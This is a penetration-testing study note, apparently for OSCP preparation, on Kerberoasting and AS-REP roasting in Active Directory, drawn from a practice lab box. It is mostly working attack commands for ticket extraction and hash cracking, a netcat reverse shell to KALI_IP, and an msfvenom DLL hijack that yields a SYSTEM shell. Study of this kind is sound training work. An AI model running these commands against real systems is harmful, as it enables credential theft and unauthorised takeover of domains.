---
title: "Kerberoasting — Attack Chain and Tools"
created: "2026-04-11"
updated: "2026-04-11"
type: permanent-note
status: active
tags:
  - permanent-note
  - active-directory
  - kerberoasting
  - windows
  - oscp
related:
  - "[[AD-Authentication-Attack-Patterns]]"
  - "[[AD-Enumeration-to-Attack-Path]]"
  - "[[Password-Cracking-Methodology]]"
  - "[[Windows-PrivEsc-Decision-Tree]]"
---

# Kerberoasting — Attack Chain and Tools

**Core idea:** Any domain user can request a Kerberos service ticket (TGS) for any account with a Service Principal Name (SPN). The ticket is encrypted with the service account's NTLM hash. You can take that ticket offline and crack it. This is Kerberoasting — a stealthy, no-exploit, zero-additional-privilege attack.

> See [[AD-Authentication-Attack-Patterns]] for the broader AD authentication picture.

---

## The Attack in 4 Steps

```
1. Identify     → find accounts with SPNs (any domain user can query)
2. Request      → get the Kerberos TGS ticket (any domain user can do this)
3. Extract      → pull the ticket hash (offline — no interaction with DC)
4. Crack        → brute-force the hash with hashcat mode 13100
```

---

## Step 1 — Identify Accounts with SPNs

```powershell
# PowerView (if available)
Get-DomainUser -SPN                   # all users with SPNs
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname

# Native PowerShell
setspn -Q */*

# From Impacket (Linux)
GetUserSPNs.py DOMAIN/username:password -dc-ip DC_IP
```

**From Access writeup:** svc_mssql had SPN `MSSQLSvc/DC.access.offsec` — the SQL service account was the Kerberoasting target.

---

## Step 2 & 3 — Request and Extract the Ticket

### Using Rubeus (Windows, on target)
```powershell
# Request TGS for all Kerberoastable accounts
.\Rubeus.exe kerberoast /nowrap

# Output: Kerberos 5 TGS-REP etype 23 hash
# Format: $krb5tgs$23$*svc_mssql$...
```

### Using Impacket (Linux, from Kali)
```bash
# Request TGS directly from Linux
GetUserSPNs.py DOMAIN/username:password -dc-ip DC_IP -request
GetUserSPNs.py DOMAIN/username:password -dc-ip DC_IP -request -outputfile kerberoast.hash
```

---

## Step 4 — Crack the Hash

```bash
# Hashcat mode 13100 = Kerberos 5 TGS-REP etype 23
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt

# With rules (better coverage)
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john kerberoast.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Using Cracked Credentials (What's Next)

Once you have `svc_mssql:trustno1` (from Access writeup):

```powershell
# Run commands as the service account
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs svc_mssql trustno1 'C:\xampp\htdocs\uploads\nc.exe KALI_IP 4444 -e cmd.exe'

# Evil-WinRM (if WinRM is open, port 5985)
evil-winrm -i TARGET -u svc_mssql -p trustno1

# CrackMapExec (lateral movement)
crackmapexec smb TARGET -u svc_mssql -p trustno1
```

---

## AS-REP Roasting (Related Attack — No SPN Required)

AS-REP Roasting targets accounts with **"Do not require Kerberos preauthentication"** enabled. No password needed to request the AS-REP — you get a hash without any credentials.

```bash
# From Linux (Impacket)
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP -request -format hashcat

# From Windows (Rubeus)
.\Rubeus.exe asreproast /nowrap

# Crack: hashcat mode 18200
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

---

## Abuse SeChangeNotifyPrivilege → SeManageVolumeAbuse (Access Box Lateral Path)

**From Access writeup — Windows PrivEsc after Kerberoasting:**
```
svc_mssql had SeChangeNotifyPrivilege and SeManageVolumePrivilege
SeManageVolumePrivilege → DLL hijacking via SeManageVolumeExploit.exe
```

```powershell
# Run exploit as svc_mssql
.\SeManageVolumeExploit.exe

# Create malicious Printconfig.dll
msfvenom -f dll -a x64 -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=9090 -o Printconfig.dll

# Copy to spool drivers path
copy Printconfig.dll C:\Windows\system32\spool\drivers\x64\3\Printconfig.dll

# Trigger via COM object
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
# → reverse shell as SYSTEM
```

---

## Key Indicators That Kerberoasting Is Possible

- **Port 88** open in Nmap output → Kerberos running → AD environment
- **Port 389** (LDAP) or **3268** (Global Catalog) → Domain Controller confirmed
- Any service account username found (svc_*, sql, http, iis, web)

---

## Connections

- [[AD-Authentication-Attack-Patterns]] — full AD auth context including Pass-the-Hash
- [[AD-Enumeration-to-Attack-Path]] — finding SPNs and attack paths with BloodHound
- [[Password-Cracking-Methodology]] — hashcat modes and wordlists
- [[Windows-PrivEsc-Decision-Tree]] — next steps after cracking the hash

---

*Primary source: Access (Proving Grounds Practice, 2023-08-16) with Rubeus + Invoke-RunasCs + SeManageVolumeExploit*
